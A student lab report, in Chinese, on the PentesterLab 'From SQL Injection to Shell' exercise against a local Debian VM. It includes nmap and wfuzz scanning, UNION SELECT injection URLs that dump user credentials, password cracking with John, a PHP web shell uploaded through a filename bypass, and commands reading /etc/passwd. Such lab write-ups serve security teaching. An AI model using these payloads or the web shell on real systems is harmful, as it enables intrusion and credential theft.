# 从SQL输入到shell
### 实验环境
- 下载ISO镜像，其实就是一个Debian服务器，用该镜像新建一个虚拟机，安装完毕后发现是个控制台。
- kali攻击者：
  - ```kali-linux-2018.3-amd64.iso```
  - 使用网卡:NatNetwork
  - 网络配置：10.0.2.8
- Debian SQL:
  - ```SQLfrom_sqli_to_shell_i386.iso```
  - 使用网卡：NatNetwork
  - 网络配置：10.0.2.15
 
![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/attacker_%E9%85%8D%E7%BD%AE.png)
![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/sql_%E9%85%8D%E7%BD%AE.png)

- 两者在同一个网段，能够ping成功
![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/attacker_ping.png)
![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/sql_ping.png)

### 实验过程
#### 指纹识别：收集有关web应用程序和正在使用的技术信息
  - 使用```nmap -A 10.0.2.15```扫描服务器，查看它的MAC地址和端口的开放情况
![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/attacker_nmap_sql.png)
  - 通过浏览器识别网页源码，发现是应用程序是用PHP编写的
  ![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/%E6%BA%90%E7%A0%81_php.png)
  - 使用BurpSuit检查HTTP标头，获取更多有用的信息
    - 先给浏览器设置代理：Preferences->Advanced->Network->Setting
  ![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE.png)
    - 将BurpSuit的默认代理拦截先关闭，然后再在浏览器访问服务器，```10.0.2.15```
    ![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/%E6%B5%8F%E8%A7%88%E5%99%A8%E9%BB%98%E8%AE%A4%E4%BB%A3%E7%90%86%E5%85%B3%E9%97%AD.png)
    ![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/burpsuit_http%E5%8A%AB%E6%8C%81.png)
    
  - 使用工具wfuzz能够强力检测web服务器上的目录和页面，运行一下命令来检测远程文件和目录
  ``` wfuzz -c -z file,wordlist/general/big.txt --hc 404 http://10.0.2.15/FUZZ```
    - ```-c```是输出字体的颜色
    - ```-z file,wordlist/general/big.txt```告诉wfuzz使用big.txt作为字典来强制远程目录的名称
    - ```--hc``` 404如果响应代码是404，告诉wfuzz忽略响应
    - ```http://10.0.2.15/FUZZ```告诉wfuzz用字典中的每个值替换URL中的单词FUZZ。
![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/wfuzz%E4%BF%A1%E6%81%AF0.png)
![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/wfuzz%E4%BF%A1%E6%81%AF1.png)
![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/wfuzz%E4%BF%A1%E6%81%AF2.png)

  - wfuzz还可以用于检测服务器上的PHP脚本
  ![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/wfuzz%E6%A3%80%E6%B5%8BPHP%E8%84%9A%E6%9C%AC.png)

#### SQL注入的检测和利用(做实验到半虚拟机卡住了，重新开始后服务器的ip变为：10.0.2.9)
 - 检测SQL注入
   - 基于整数的检测
    在地址栏输入
   ``` 
   10.0.2.9/cat.php?id=1
   10.0.2.9/cat.php?id=2
   10.0.2.9/cat.php?id=3
   ```
   得到如下访问结果
![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/id%3D1%2C2.png)

   如果输入10.0.2.9/cat.php?id=2'数据库将引发错误，多了一个'，因为该SQL的请求语法不正确
    ![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/id%3D2%2C3.png)
    
   如果输入10.0.2.9/cat.php?id=2-1，效果和输入10.0.2.9/cat.php?id=1一样，2-1操作由数据库自动执行
    ![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/id%3D1%2C2-1.png)
    
     - 基于字符串的检测
       - 作为一般规则，奇数个单引号会引发错误，偶数个单引号不会发生错误 
       - 如果在单引号后面加上```--```表示后面的内容会被注释掉，因此不会受到错误提示
  ![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/id%3D1'.png)
- 利用SQL注入
  - UNION关键字 
  - 步骤：
    - 找到执行UNION的列数
    - 查找页面中回显的列
    - 从数据库元表中检索信息
    - 从其他表/数据库中检索信息
  - 猜列数
    - 使用UNION SELECT
    ![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/%E7%8C%9C%E5%88%97%E6%95%B0.png)
    - 使用order by,order by主要用于告诉数据库应该使用哪个列来排序结果，如下图，按不同的列，返回结果不同
    【order_by】
![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/order_by.png)
- 进行以上操作后，我们猜测数据库有4列
- 检索信息
  - 查找页面中回显的列,确定回显在第二列
  ``` 
  http://10.0.2.9/cat.php?id=1%20UNION%20SELECT%20@@version,2,3,4
  http://10.0.2.9/cat.php?id=1%20UNION%20SELECT%201,@@version,3,4
  ```
  ![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/%E5%9B%9E%E6%98%BE1.png)
   ``` 
   http://10.0.2.9/cat.php?id=1%20UNION%20SELECT%201,2,@@version,4
   http://10.0.2.9/cat.php?id=1%20UNION%20SELECT%201,2,3,@@version
   ```
   ![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/%E5%9B%9E%E6%98%BE2.png)

  - 找到当前数据库中所有表的名称和表的列的名称
  ```
  http://10.0.2.9/cat.php?id=1 UNION SELECT 1,concat(table_name,':', column_name),3,4 FROM information_schema.columns
  ```
  - 根据得到结果猜测用户名和密码存储在users表中
![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/users.png)
  - 将users表中的信息显示出来
  ```
  http://10.0.2.9/cat.php?id=1 UNION SELECT 1,concat(login,':',password),3,4 FROM users
  ```
![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/users%E4%BF%A1%E6%81%AF.png)

#### 访问管理页面和代码执行
  - 破解密码 
    - google搜索

    ![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/password0.png)
    ![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/password.png)

    - 使用John可以破解该密码,先使用gunzip rocketyou.txt.gz 解压得到rocketyou.txt
    把用户名和密码密文写入到password中，执行
    ```
    john password --format=raw-md5  --wordlist=/usr/share/wordlists/rockyou.txt --rules
    ```
得到如下：

![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/john%E7%A0%B4%E8%A7%A3.png)

- 进行代码注入
  - 使用已经获得的用户名和密码登录到页面
  ![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/login.png)
  ![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/login1.png)
  - 创建test.php
  ```
  <?php 
  system($_GET['cmd']);
  ?>
  ```
 
  - add a new picture后，可以看到文件没有正确上传，应用程序阻止上传.php的文件

  ![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/add1.png)
  ![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/add2.png)

  - 将文件名改为test.php.test文件上传成功
  ![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/add3.png)
  - 查看网页原码
  ![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/html.png)

- 利用url执行cmd命令获取服务器信息
```
10.0.2.9/admin/uploads/test.php.test?cmd=uname
```
![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/linux.png)
获取系统用户的完整信息
```
10.0.2.9/admin/uploads/test.php.test?cmd=cat /etc/passwd
```
![image](https://github.com/CUCCS/2018-NS-Public-PWHL/blob/NS_chap0x07/ns_chap0x07/linux1.png)

- 参考资料
  - [从SQL注入到Shell ](https://pentesterlab.com/exercises/from_sqli_to_shell) 
  - [2018-NS-Public-FLYFLY-H ](https://github.com/CUCCS/2018-NS-Public-FLYFLY-H/)
  - [2018-NS-Public-luyj ](https://github.com/CUCCS/2018-NS-Public-luyj)

  



    

